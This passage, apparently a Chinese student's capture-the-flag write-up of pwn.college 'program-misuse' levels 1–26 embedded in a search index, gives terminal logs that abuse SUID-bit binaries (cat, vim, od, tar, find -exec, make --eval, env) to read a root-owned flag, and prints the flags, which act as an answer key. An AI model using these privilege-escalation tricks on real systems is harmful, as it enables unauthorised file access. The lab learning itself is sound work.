:"level124"},{"location":"en/CSE466/program-interaction/#level125","text":"","title":"level125"},{"location":"en/CSE466/program-interaction/#level126","text":"","title":"level126"},{"location":"en/CSE466/program-interaction/#level127","text":"","title":"level127"},{"location":"en/CSE466/program-interaction/#level128","text":"","title":"level128"},{"location":"en/CSE466/program-interaction/#level129","text":"","title":"level129"},{"location":"en/CSE466/program-interaction/#level130","text":"","title":"level130"},{"location":"en/CSE466/program-interaction/#level131","text":"","title":"level131"},{"location":"en/CSE466/program-interaction/#level132","text":"","title":"level132"},{"location":"en/CSE466/program-interaction/#level133","text":"","title":"level133"},{"location":"en/CSE466/program-interaction/#level134","text":"","title":"level134"},{"location":"en/CSE466/program-interaction/#level135","text":"","title":"level135"},{"location":"en/CSE466/program-interaction/#level136","text":"","title":"level136"},{"location":"en/CSE466/program-interaction/#level137","text":"","title":"level137"},{"location":"en/CSE466/program-interaction/#level138","text":"","title":"level138"},{"location":"en/CSE466/program-interaction/#level139","text":"","title":"level139"},{"location":"en/CSE466/program-interaction/#level140","text":"","title":"level140"},{"location":"en/CSE466/program-interaction/#level141","text":"","title":"level141"},{"location":"en/CSE466/program-interaction/#level142","text":"","title":"level142"},{"location":"en/CSE466/program-misuse/","text":"knowledge \u57fa\u672c\u77e5\u8bc6 linux\u3001\u547d\u4ee4\u884c\u3001\u8fdb\u7a0b\u3001\u6587\u4ef6\u7cfb\u7edf\u3001\u76ee\u5f55\u3001\u8f6f\u8fde\u63a5\u548c\u786c\u94fe\u63a5\u3001\u8def\u5f84\uff08\u7edd\u5bf9\u3001\u76f8\u5bf9\uff09\u3001\u7ba1\u9053\u3001\u91cd\u5b9a\u5411 ref \u5173\u4e8e\u8f6f\u8fde\u63a5\uff0c\u8fd9\u91cc\u6709\u51e0\u4e2a\u4e0d\u9519\u7684\u53c2\u8003 - \u633a\u6e05\u695a\u7684\u8bb2\u89e3 - \u83dc\u9e1f \u7136\u540e\u662f\u6743\u9650\u3001\u63d0\u6743\u7684\u5185\u5bb9 \u8fd9\u91cc\u9700\u8981\u660e\u767d\u6743\u9650\u3001\u7528\u6237\u3001\u7528\u6237\u7ec4\u8fd9\u4e9b\u6982\u5ff5\uff0c\u4ee5\u53ca\u975e\u5e38\u975e\u5e38\u91cd\u8981\u7684uid gid\u7b49\u5185\u5bb9 SUID: execute with the eUID of the file owner rather than the parent process. SGID: execute with the eGID of the file owner rather than the parent process. Sticky: used for shared directories to limit file removal to file owners. Three different type of user and group IDs: Effective (eUID, eGID): the UID/GID used for most access checks. Real (UID, GID): the \"real\" UID (or GID) of the process owner, used for things such as signal checks. Saved: a UID/GID that your process could switch its eUID/eGID to. Used for temporarily dropping privileges. ref \u4e00\u4e2a\u535a\u5ba2 \u8fd9\u4e2a\u535a\u5ba2\u7684\u98ce\u683c\u6211\u5f88\u559c\u6b22\uff0c\u54ea\u5929\u5077\u8fc7\u6765 challenges useful shell #!/bin/bash # \u8fdb\u5165/challenge\u76ee\u5f55 cd /challenge # \u83b7\u53d6\u8be5\u76ee\u5f55\u4e0b\u552f\u4e00\u7684\u6587\u4ef6\u540d filename=$(ls) # \u6267\u884c\u8be5\u6587\u4ef6 ./$filename then sh filename.sh level1 Lets you directly read the flag! hacker@program-misuse-level-1:/challenge$ ./babysuid_level1 Welcome to ./babysuid_level1! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/cat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cat! hacker@program-misuse-level-1:/challenge$ \u5df2\u7ecf\u7ed9\u6211uid\u4e86\uff0c\u7136\u540e\u6211\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef hacker@program-misuse-level-1:/$ ls bin boot challenge dev etc flag home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var hacker@program-misuse-level-1:/$ cat flag pwn.college{gtmGRqQdewLiKKwB2Wi1NeBxX3w.01M0EDL2QjMyMzW} hacker@program-misuse-level-1:/$ level2 Lets you directly read the flag! hacker@program-misuse-level-2:/challenge$ ./babysuid_level2 Welcome to ./babysuid_level2! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/more. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/more! hacker@program-misuse-level-2:/challenge$ \u8fd9\u4e2a\u662f\u7528 more \u8bfb\u53d6 hacker@program-misuse-level-2:/challenge$ more /flag pwn.college{g0orxg7_IfgidrE5G2scOM8wdRx.0FN0EDL2QjMyMzW} hacker@program-misuse-level-2:/challenge$ level3 Lets you directly read the flag! hacker@program-misuse-level-3:/challenge$ ./babysuid_level3 Welcome to ./babysuid_level3! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/less. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/less! hacker@program-misuse-level-3:/challenge$ \u8fd9\u6b21\u662f\u7528 less hacker@program-misuse-level-3:/challenge$ less /flag pwn.college{onJWxeGXCk8o-LqXlLemr-Xzk2W.0VN0EDL2QjMyMzW} /flag (END) less\u6bd4more\u597d\u7528\uff0c\u8bb0\u5f97\u4f7f\u7528q\u9000\u51fa level4 Lets you directly read the flag! hacker@program-misuse-level-4:/challenge$ ./babysuid_level4 Welcome to ./babysuid_level4! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/tail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tail! hacker@program-misuse-level-4:/challenge$ \u7528 tail hacker@program-misuse-level-4:/challenge$ tail /flag pwn.college{8A8n6zzy-sUTn179ZADopx1lzFV.0lN0EDL2QjMyMzW} hacker@program-misuse-level-4:/challenge$ \u6211\u73b0\u5728\u731c\u4e0b\u4e00\u4e2a\u7528head level5 Lets you directly read the flag! hacker@program-misuse-level-5:~$ sh file.sh Welcome to ./babysuid_level5! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/head. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/head! hacker@program-misuse-level-5:~$ \u679c\u7136\u7528head hacker@program-misuse-level-5:~$ head /flag pwn.college{wVl3wFV0tMkY6rAFaMWKvEoOt2R.01N0EDL2QjMyMzW} hacker@program-misuse-level-5:~$ level6 Lets you directly read the flag! hacker@program-misuse-level-6:~$ sh file.sh Welcome to ./babysuid_level6! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/sort. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level6) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sort! hacker@program-misuse-level-6:~$ sort /flag pwn.college{wRB7HgX_kvB4Uro33D7t1UKWZcE.0FO0EDL2QjMyMzW} hacker@program-misuse-level-6:~$ \u8fd9\u6b21\u5c45\u7136\u662f\u7528sort \u8fd9\u91cc\u505a\u4e00\u4e2a\u5c0f\u603b\u7ed3\uff0c\u4ee5\u4e0a\u8fd9\u51e0\u4e2a\u5de5\u5177\u90fd\u975e\u5e38\u5e38\u7528\uff0c\u800c\u4e14\u7ecf\u5e38\u662f\u7ec4\u5408\u4f7f\u7528\u7684\uff0c\u5efa\u8bae\u4f7f\u7528 man \u9605\u8bfb\u624b\u518c\uff0c\u7136\u540e\u591a\u5c1d\u8bd5\u642d\u914d\u4f7f\u7528\u3002 level7 Shows you that an over-privileged editor is a very powerful tool! hacker@program-misuse-level-7:~$ sh file.sh Welcome to ./babysuid_level7! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/vim. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/vim! hacker@program-misuse-level-7:~$ vim /flag \u4ece\u6807\u9898\u80fd\u770b\u51fa\u6765\u662f\u7528\u67d0\u79cd\u7f16\u8f91\u5de5\u5177\uff0c\u8fd9\u6b21\u662f vim pwn.college{YA-02bwpz2aH0bVuFckXnVUE_a8.0VO0EDL2QjMyMzW} \u6211\u731c\u540e\u8fb9\u513f\u5f97\u6709nano emacs\u7b49\u7b49 level8 Shows you that an over-privileged editor is a very powerful tool! hacker@program-misuse-level-8:~$ sh file.sh Welcome to ./babysuid_level8! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/emacs. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/emacs! \u679c\u7136\u4e0d\u51fa\u6211\u6240\u6599hhh pwn.college{sCKRHf2_yRVb3Q_MEPjyLzcoqdN.0FM1EDL2QjMyMzW} emacs\u4e5f\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u53ef\u4ee5\u5b66\u4e00\u5b66\u3002 \u8fd9\u91cc\u9000\u51fa\u547d\u4ee4\u662f level9 Shows you that an over-privileged editor is a very powerful tool! hacker@program-misuse-level-9:~$ sh file.sh Welcome to ./babysuid_level9! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/nano. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level9) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nano! hacker@program-misuse-level-9:~$ nano /flag \u6211\u679c\u7136\u6599\u4e8b\u5982\u795e pwn.college{w4DHxmYT2HQw-wrXkHpQXqNmIWW.0VM1EDL2QjMyMzW} \u9000\u51fa\u547d\u4ee4\u662f level10 Requires you to understand their output to derive the flag from it! \u4e00\u53e5\u9898\u5916\u8bdd\uff0c\u4e0d\u540c\u6311\u6218\u4e4b\u95f4\u65e0\u7f1d\u5207\u6362\u597d\u5feb\u554a\uff0c\u5f88\u9002\u5408Linux\u76f4\u63a5\u7528terminal\u94fe\u63a5\uff01 hacker@program-misuse-level-10:~$ sh file.sh Welcome to ./babysuid_level10! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/rev. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level10) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/rev! rev \u662f\u53cd\u5e8f\u8f93\u51fa\u7684\u5de5\u5177 \u4f46\u662f\u96be\u4e0d\u4f4f\u6211 hacker@program-misuse-level-10:~$ rev /flag }WzMyMjQ2LDE1Ml0.iqRmReNkY5WaIyBZQULv-MYk7kI{egelloc.nwp hacker@program-misuse-level-10:~$ rev /flag | rev pwn.college{Ik7kYM-vLUQZByIaW5YkNeRmRqi.0lM1EDL2QjMyMzW} hacker@program-misuse-level-10:~$ level11 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-11:~$ sh file.sh Welcome to ./babysuid_level11! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/od. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level11) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/od! od \u901a\u5e38\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\u6216\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 hacker@program-misuse-level-11:~$ od -A x -t x1z -v /flag 000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 73 4b 47 35 >pwn.college{sKG5< 000010 6d 6b 70 75 44 35 38 63 71 76 44 65 33 32 39 4e >mkpuD58cqvDe329N< 000020 57 6c 4f 36 31 41 39 2e 30 31 4d 31 45 44 4c 32 >WlO61A9.01M1EDL2< 000030 51 6a 4d 79 4d 7a 57 7d 0a >QjMyMzW}.< 000039 hacker@program-misuse-level-11:~$ \u770b\u4e86\u6587\u6863\u5c31\u4f1a\u4e86\uff0c\u8fd9\u4e2a\u547d\u4ee4\u76f4\u63a5\u5199\u5728\u6587\u6863\u91cc\u3002 pwn.college{sKG5mkpuD58cqvDe329NWlO61A9.01M1EDL2QjMyMzW} level12 Requires you to understand their output to derive the flag from it! Welcome to ./babysuid_level12! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/hd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level12) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/hd! \u5947\u602a\u7684 hd \u5de5\u5177\uff0c\u5341\u516d\u8fdb\u5236\u7684\u3002 hacker@program-misuse-level-12:~$ hd /flag 00000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 6f 47 7a 69 |pwn.college{oGzi| 00000010 37 55 30 32 58 54 6c 5f 64 73 6e 50 43 77 73 42 |7U02XTl_dsnPCwsB| 00000020 52 38 6d 59 54 77 6d 2e 30 46 4e 31 45 44 4c 32 |R8mYTwm.0FN1EDL2| 00000030 51 6a 4d 79 4d 7a 57 7d 0a |QjMyMzW}.| 00000039 hacker@program-misuse-level-12:~$ man hd \u8fd9\u91cc\u5df2\u7ecf\u53ef\u4ee5\u76f4\u63a5\u590d\u5236\u4e86\uff0c\u4f46\u662f\u5e0c\u671b\u6709\u66f4\u7b80\u4fbf\u7684\u5f62\u52bf\uff0c\u53bb\u770b\u4e86\u6587\u6863\uff0c\u4f46\u662f\u6ca1\u592a\u7814\u7a76\u660e\u767d\uff0c\u778e\u6574\u4e86\u4e00\u4e2a\u8f93\u51fa hacker@program-misuse-level-12:~$ hd -f /flag hd: \"pwn.college{oGzi7U02XTl_dsnPCwsBR8mYTwm.0FN1EDL2QjMyMzW}\": bad format hacker@program-misuse-level-12:~$ level13 Requires you to understand their output to derive the flag from it! Welcome to ./babysuid_level13! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/xxd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level13) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/xxd! xxd \uff0c\u662f\u4e2a\u4e8c\u8fdb\u5236\u7684\u5de5\u5177\u3002\u8fd9\u4e2a\u6211\u4f1a hacker@program-misuse-level-13:~$ xxd /flag 00000000: 7077 6e2e 636f 6c6c 6567 657b 4d56 2d59 pwn.college{MV-Y 00000010: 6e5f 3465 4777 6c63 6f49 5438 4a63 574a n_4eGwlcoIT8JcWJ 00000020: 6934 7764 2d53 692e 3056 4e31 4544 4c32 i4wd-Si.0VN1EDL2 00000030: 516a 4d79 4d7a 577d 0a QjMyMzW}. \u7136\u540e\u624b\u52a8\u590d\u5236... pwn.college{MV-Yn_4eGwlcoIT8JcWJi4wd-Si.0VN1EDL2QjMyMzW} level14 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-14:~$ sh file.sh Welcome to ./babysuid_level14! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base32. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level14) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base32! base32 \u90fd\u51fa\u6765\u4e86,\u5c31\u4e00\u4e2a\u53c2\u6570 -d hacker@program-misuse-level-14:~$ base32 /flag OB3W4LTDN5WGYZLHMV5UCT3NM4ZWGTLYK5YV6SCVOR2XC5CSMF4WM6LML5UWE4ZOGBWE4MKFIRGD EULKJV4U26SXPUFA==== hacker@program-misuse-level-14:~$ base32 /flag | base32 -d pwn.college{AOmg3cMxWq_HUtuqtRayfyl_ibs.0lN1EDL2QjMyMzW} hacker@program-misuse-level-14:~$ \u90a3\u6211\u731c\u4e0b\u4e00\u4e2a\u662fbase64 level15 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-15:~$ sh file.sh Welcome to ./babysuid_level15! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base64. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level15) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base64! hacker@program-misuse-level-15:~$ \u563f\u563f\uff0c\u679c\u7136 hacker@program-misuse-level-15:~$ base64 /flag | base64 -d pwn.college{QvvMGkZ_gpVBCBw1u5dYReqKajl.01N1EDL2QjMyMzW} hacker@program-misuse-level-15:~$ level16 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-16:~$ sh file.sh Welcome to ./babysuid_level16! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/split. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/split! split \u662f\u4e00\u4e2a\u5206\u5757\u7684\u5de5\u5177\uff0c\u4f46\u662f\u7531\u4e8e\u9898\u4e2d\u7684flag\u5f88\u5c0f\uff0c\u8fd8\u8fbe\u4e0d\u5230\u5b83\u9ed8\u8ba4\u7684\u9650\u5ea6\uff08\u9ed8\u8ba4\u53c2\u6570\u9700\u8981\u770b\u624b\u518c\uff09\uff0c\u56e0\u6b64\u5728\u8fd0\u884c split /flag \u4e4b\u540e\uff0c\u5c31\u4f1a\u5728\u6587\u4ef6\u5939\u4e4b\u4e0b\u6709\u4e2a\u8f93\u51fa\u6587\u4ef6\u3002 hacker@program-misuse-level-16:~$ cat xaa pwn.college{oqsgCLV3hcD9AXs5bELwauYQHup.0FO1EDL2QjMyMzW} \u5c0f\u603b\u7ed3\uff0c\u9664\u4e86\u6700\u8fd1\u57fa\u672c\u7684\u8fdb\u5236\u3001ascii\u7b49\uff0cbase32\u548cbase64\u6700\u597d\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e0b\u8fd9\u4e24\u79cd\u7f16\u7801\u65b9\u5f0f level17 Forces you to understand different archive formats! hacker@program-misuse-level-17:~$ sh file.sh Welcome to ./babysuid_level17! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/gzip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gzip! \u725b\u9a6c\u7684 gzip \uff0c\u538b\u7f29\u548c\u89e3\u538b\u7f29\uff0c\u770b\u6765\u540e\u51e0\u4e2a\u90fd\u662f\u8fd9\u4e2a\u610f\u601d \u7136\u540e\u5f00\u59cb\u79d2\u9898 hacker@program-misuse-level-17:~$ gzip -f /flag -t hacker@program-misuse-level-17:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.gz lib lib64 media opt root sbin sys usr hacker@program-misuse-level-17:~$ gzip -cd /flag.gz pwn.college{QHVq0GV7-f7QFzzNe2jTzkeq6T8.0VO1EDL2QjMyMzW} hacker@program-misuse-level-17:~$ level18 Forces you to understand different archive formats! \u5f00\u59cb\u65e0\u804a\u8d77\u6765\u4e86\u3002\u3002\u3002 hacker@program-misuse-level-18:~$ sh file.sh Welcome to ./babysuid_level18! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/bzip2. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2! \u7136\u540e\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u5b8c\u5168\u4e00\u6837\uff0c\u5c31\u662f\u538b\u7f29\u7684\u683c\u5f0f\u548c\u7b97\u6cd5\u4e0d\u540c\u4e86 hacker@program-misuse-level-18:~$ bzip2 -f /flag hacker@program-misuse-level-18:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.bz2 lib lib64 media opt root sbin sys usr hacker@program-misuse-level-18:~$ bzip2 -cd /flag.bz2 pwn.college{wkf3JjpEoyTnVUz5mUbAtllNMRn.0FM2EDL2QjMyMzW} hacker@program-misuse-level-18:~$ level19 Forces you to understand different archive formats! Welcome to ./babysuid_level19! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/zip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/zip! \u8fd9\u51e0\u4e2a\u9898\u53ef\u6709\u70b9\u513f\u70e6\u4eba\u4e86\u554a\uff01 hacker@program-misuse-level-19:~$ cat /flag.zip PK V3199flagUT \ufffddBdux pwn.college{YFFLGakdSzjIgW7btl64EaiEyDf.0VM2EDL2QjMyMzW} PK V3199flagUT\ufffddux PKJwhacker@program-misuse-level-19:~$ \u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662f\u5148\u89e3\u538b\uff0c\u4f46\u662f\u8c8c\u4f3c\u80fd\u76f4\u63a5\u770b\uff0c\u6211\u5c31\u6ca1\u7ba1 level20 Forces you to understand different archive formats! hacker@program-misuse-level-20:~$ sh file.sh Welcome to ./babysuid_level20! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/tar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tar! tar \u6bd4\u8f83\u5e38\u89c1\u3002 hacker@program-misuse-level-20:~$ tar cf /flag.tar /flag tar: Removing leading `/' from member names hacker@program-misuse-level-20:~$ ls / bin challenge etc flag.tar lib lib64 media opt root sbin sys usr boot dev flag home lib32 libx32 mnt proc run srv tmp var hacker@program-misuse-level-20:~$ cat /flag.tar flag0000400000000000000000000000007114456374677010423 0ustar rootrootpwn.college{YNojFHYmMjDXxa2MP_mFcpOEIIo.0lM2EDL2QjMyMzW} hacker@program-misuse-level-20:~$ \u597d\u50cf\u90fd\u53ef\u4ee5\u76f4\u63a5\u7528cat\u770b\u538b\u7f29\u5305\uff0c\u90a3\u4e48\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86 level21 Forces you to understand different archive formats! hacker@program-misuse-level-21:~$ sh file.sh Welcome to ./babysuid_level21! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/ar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level21) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ar! ar \u5de5\u5177\uff0c\u96c6\u5408\u5f88\u591a\u6587\u6863\u5b58\u6210\u4e00\u4e2a\u6587\u6863\u7684\u5de5\u5177 hacker@program-misuse-level-21:~$ ar rs /flag.a /flag ar: creating /flag.a hacker@program-misuse-level-21:~$ cat /flag.a !<arch> flag/ 0 0 0 644 57 ` pwn.college{0vq28yii-jRYCSQP_DtM3bkf8ee.01M2EDL2QjMyMzW} hacker@program-misuse-level-21:~$ level22 Forces you to understand different archive formats! hacker@program-misuse-level-22:~$ sh file.sh Welcome to ./babysuid_level22! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/cpio. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cpio! cpio \u5de5\u5177\uff0c\u7528\u4e8e\u6587\u4ef6\u5907\u4efd\u7684 hacker@program-misuse-level-22:~$ find /flag | cpio -ov > archive.cpio /flag 1 block hacker@program-misuse-level-22:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag lib lib64 media opt root sbin sys usr hacker@program-misuse-level-22:~$ ls Desktop Downloads Pictures Templates archive.cpio file.sh Documents Music Public Videos core test.py hacker@program-misuse-level-22:~$ cat archive.cpio \ufffdwd\ufffd9/flagpwn.college{om324dLj5vHeY7kTe9p_qAFQ1Cy.0FN2EDL2QjMyMzW} \ufffd TRAILER!!!hacker@program-misuse-level-22:~$ level23 Forces you to understand different archive formats! hacker@program-misuse-level-23:~$ sh file.sh Welcome to ./babysuid_level23! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/genisoimage. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage! genisoimage \u5de5\u5177\uff0c\u80fd\u770b\u51fa\u6765\u4f5c\u7528\u662f\u5efa\u7acbISO 9660\u6620\u50cf\u6587\u4ef6 er@program-misuse-level-23:~$ genisoimage -sort /flag genisoimage: Incorrect sort file format pwn.college{YROFw7Q_KvLF86Vs3WeI_XDvziT.0VN2EDL2QjMyMzW} hacker@program-misuse-level-23:~$ \u8fd9\u5757\u513f\u597d\u50cfcat\u4e0d\u592a\u661f\u4e86\uff0c\u8f93\u51fa\u4f1a\u6253\u4e71shell \u5c0f\u603b\u7ed3\uff1a\u5012\u662f\u77e5\u9053\u4e86\u5f88\u591a\u4ee5\u524d\u4e0d\u77e5\u9053\u7684\u5de5\u5177\u3002 level24 Enables you to read flags by making them execute other commands! sh hacker@program-misuse-level-24:~$ sh file.sh Welcome to ./babysuid_level24! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/env. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level24) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/env! \u5f00\u59cb\u6709\u610f\u601d\u8d77\u6765\u4e86\u3002 hacker@program-misuse-level-24:~$ env cat /flag pwn.college{8rPxiO1f2sBGHUvcT83glFWNSpM.0lN2EDL2QjMyMzW} hacker@program-misuse-level-24:~$ env\u53ef\u4ee5\u7ed9\u5176\u4ed6\u7684\u7a0b\u5e8f\u8d4b\u6743\uff1f\u611f\u89c9\u662f\u8fd9\u4e2a\u610f\u601d\uff0c\u5f53\u7136\u51fa\u9898\u4eba\u60f3\u8981\u7684\u610f\u601d\u5e94\u8be5\u662f\u9700\u8981\u5148\u8bbe\u4e00\u4e2ashell\uff0c\u7136\u540e\u6267\u884c\u3002 level25 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-25:~$ sh file.sh Welcome to ./babysuid_level25! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/find. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/find! \u4f7f\u7528find hacker@program-misuse-level-25:~$ find / -type f -name \"flag\" -exec cat {} \\; pwn.college{Uomlfru_u94ZuszsvlNzA0n6x39.01N2EDL2QjMyMzW} hacker@program-misuse-level-25:~$ \u8fd9\u91cc\u9700\u8981\u8003\u8651\u7684\u662ffind\u53ea\u662f\u627e\u5230\uff0c\u5982\u4f55\u8bfb\u53d6\uff1f \u4f7f\u7528 -exec level26 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-26:~$ sh file.sh Welcome to ./babysuid_level26! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/make. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level26) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/make! \u6709\u70b9\u513f\u610f\u601d\u554a\uff0c\u76f4\u63a5\u51fa\u73b0\u4e86GNU Make\u4e86 hacker@program-misuse-level-26:~$ COMMAND='cat /flag';make -s --eval=$'x:\\n\\t-'\"$COMMAND\" pwn.college{oYDGLL2PogQjUYR2TV30VTUm-4z.0FO2EDL2QjMyMzW} hacker@program-misuse-level-26:~$ \u8fd9\u4e2a\u641c\u4e86\u4e00\u4e0b\uff0c\u7136\u540e\u4e0d\u5149\u67e5\u5230\u4e86\u6b63\u786e\u7b54\u6848\u8fd8\u53d1\u73b0\u81ea\u5df1\u505a\u9519\u4e86\uff0c\u51fa\u9898\u4eba\u60f3\u8981\u7684\u662f sh -p \u8fd9\u6837\u63d0\u6743 \u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u8be5\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u5305\u542b\u4ee5\u4e0b\u90e8\u5206\uff1a env\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u547d\u4ee4\u65f6\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u5de5\u5177\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9\u65b0\u7684shell\u8fdb\u7a0b\u3002 sh\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u542f\u52a8shell\u8fdb\u7a0b\u7684\u547d\u4ee4\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\u3002 